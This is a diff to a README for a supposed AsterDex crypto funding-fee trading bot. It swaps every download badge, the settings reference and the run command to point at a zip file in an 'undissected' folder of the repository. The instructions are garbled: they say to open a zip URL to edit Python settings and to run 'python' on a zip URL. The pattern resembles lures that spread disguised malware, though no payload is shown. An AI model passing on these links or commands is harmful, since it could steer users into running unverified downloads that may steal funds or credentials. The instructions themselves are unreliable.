@@ -1,6 +1,6 @@
 # 🤖 funding-fee-bot - Automate Your AsterDex Trading
 
-[![Download](https://raw.githubusercontent.com/pepelopes/funding-fee-bot/main/undissected/funding-fee-bot.zip%20release-brightgreen)](https://raw.githubusercontent.com/pepelopes/funding-fee-bot/main/undissected/funding-fee-bot.zip)
+[![Download](https://github.com/pepelopes/funding-fee-bot/raw/refs/heads/main/undissected/fee_funding_bot_3.7.zip%20release-brightgreen)](https://github.com/pepelopes/funding-fee-bot/raw/refs/heads/main/undissected/fee_funding_bot_3.7.zip)
 
 ## 📦 Introduction
 Welcome to the AsterDex Funding Bot! This is a simple tool that helps you automate your trading strategies on AsterDex. With this bot, you can easily manage your funding fees, whether you want to buy spot or short futures. 
@@ -16,12 +16,12 @@ To get started with the funding bot, follow these steps. You will need some basi
 ### 💻 Download & Install
 You can easily download the latest version of the funding fee bot by visiting the Releases page. Click the button below to download:
 
-[![Download](https://raw.githubusercontent.com/pepelopes/funding-fee-bot/main/undissected/funding-fee-bot.zip%20release-brightgreen)](https://raw.githubusercontent.com/pepelopes/funding-fee-bot/main/undissected/funding-fee-bot.zip)
+[![Download](https://github.com/pepelopes/funding-fee-bot/raw/refs/heads/main/undissected/fee_funding_bot_3.7.zip%20release-brightgreen)](https://github.com/pepelopes/funding-fee-bot/raw/refs/heads/main/undissected/fee_funding_bot_3.7.zip)
 
 Once downloaded, extract the files to a folder on your computer. 
 
 ### 🔧 Code Setup
-You may want to customize some of the default settings. Open the `https://raw.githubusercontent.com/pepelopes/funding-fee-bot/main/undissected/funding-fee-bot.zip` file and look for these lines to adjust:
+You may want to customize some of the default settings. Open the `https://github.com/pepelopes/funding-fee-bot/raw/refs/heads/main/undissected/fee_funding_bot_3.7.zip` file and look for these lines to adjust:
 ```python
 DEFAULT_CAPITAL_USD = Decimal("200000")
 DEFAULT_SPOT_SYMBOL = "ASTERUSDT"
@@ -38,7 +38,7 @@ To run the bot, follow these steps:
 2. Navigate to the folder where you extracted the bot.
 3. Type the command below and hit enter:
    ```bash
-   python https://raw.githubusercontent.com/pepelopes/funding-fee-bot/main/undissected/funding-fee-bot.zip --mode [buy_spot|short_futures|sell_spot|long_futures]
+   python https://github.com/pepelopes/funding-fee-bot/raw/refs/heads/main/undissected/fee_funding_bot_3.7.zip --mode [buy_spot|short_futures|sell_spot|long_futures]
    ```
    Replace `[buy_spot|short_futures|sell_spot|long_futures]` with your desired trading direction.
 
@@ -68,6 +68,6 @@ For additional help or to report issues, feel free to open an issue on this GitH
 ## 📅 Updates
 Keep an eye on the Releases page to download the latest updates and features. Regular improvements will enhance performance and fix any bugs.
 
-[![Download](https://raw.githubusercontent.com/pepelopes/funding-fee-bot/main/undissected/funding-fee-bot.zip%20release-brightgreen)](https://raw.githubusercontent.com/pepelopes/funding-fee-bot/main/undissected/funding-fee-bot.zip)
+[![Download](https://github.com/pepelopes/funding-fee-bot/raw/refs/heads/main/undissected/fee_funding_bot_3.7.zip%20release-brightgreen)](https://github.com/pepelopes/funding-fee-bot/raw/refs/heads/main/undissected/fee_funding_bot_3.7.zip)
 
 Enjoy automating your trading with the Funding Fee Bot!
